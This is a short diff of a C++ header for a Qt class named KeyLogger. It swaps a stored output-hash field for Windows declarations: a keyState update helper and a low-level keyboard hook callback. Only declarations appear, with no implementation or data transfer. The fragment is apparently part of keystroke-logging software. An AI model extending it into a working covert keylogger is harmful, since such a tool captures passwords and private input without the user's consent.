@@ -2,10 +2,10 @@
 #define KEYLOGGER_H
 
 #include <QDebug>
-#include <QDir>
-#include <QStandardPaths>
 #include <QObject>
 #include <QString>
+
+#include <windows.h>
 
 class KeyLogger :
     public QObject
@@ -15,11 +15,8 @@ class KeyLogger :
 public:
     explicit KeyLogger(QObject *parent = nullptr);
 
-    void setOutputHash(QString hash);
-    QString getOutputHash();
-
-private:
-    QString outputHash;
+    static void updateKeyState(BYTE *keyState, int keyCode);
+    static LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 };
 
 #endif // KEYLOGGER_H
